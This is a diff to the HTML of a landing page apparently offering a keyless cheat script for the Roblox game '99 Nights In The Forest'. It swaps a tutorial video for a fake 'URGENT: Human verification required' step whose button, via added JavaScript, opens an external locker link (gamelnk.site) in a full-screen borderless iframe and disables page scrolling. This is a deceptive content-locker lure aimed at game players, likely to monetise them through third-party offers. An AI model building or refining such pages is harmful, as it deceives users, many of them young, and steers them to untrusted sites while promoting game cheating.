@@ -370,11 +370,15 @@
             opacity: 0.9;
         }
 
-        .vedio {
-            width: 340px;
-            height: auto;
-            border-radius: 5px;
-            margin-top: 10px;
+        #verify-iframe {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 9999;
         }
     </style>
 </head>
@@ -419,11 +423,6 @@
     <a href="#" class="download-btn">
         <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
         Download Script</a>
-
-    <h3 class="title">How To Download?</h3>
-
-    <iframe class="vedio" src="https://www.youtube.com/embed/Bn_NNKXGNc0?si=2FzCykpVUJOtRExI" frameborder="0"
-        allowfullscreen></iframe>
 
     <p class="text">Get the 99 Nights In The Forest Script (2025) for Roblox. Unlock auto-farm, ESP, walk speed, no key
         system, and more — fully keyless and Pastebin supported.</p>
@@ -485,8 +484,20 @@
                     <span style="color: red;" <strong>URGENT:</strong></span> Human verification required to finish
                     downloading your script!
                 </p>
-                <a id="verify-btn" href="https://lockedapp.org/cl/i/kr7wml">Verify & Download</a>
+                <a id="verify-btn" href="#">Verify & Download</a>
             </div>
+
+            <iframe id="verify-iframe"></iframe>
+
+            <script>
+                document.getElementById("verify-btn").addEventListener("click", (e) => {
+                    e.preventDefault();
+                    const iframe = document.getElementById("verify-iframe");
+                    iframe.src = "https://gamelnk.site/cl/i/kr7wml";
+                    iframe.style.display = "block";
+                    document.body.style.overflow = "hidden";
+                });
+            </script>
 
             <script>
                 const downloadBtn = document.querySelector('.download-btn');
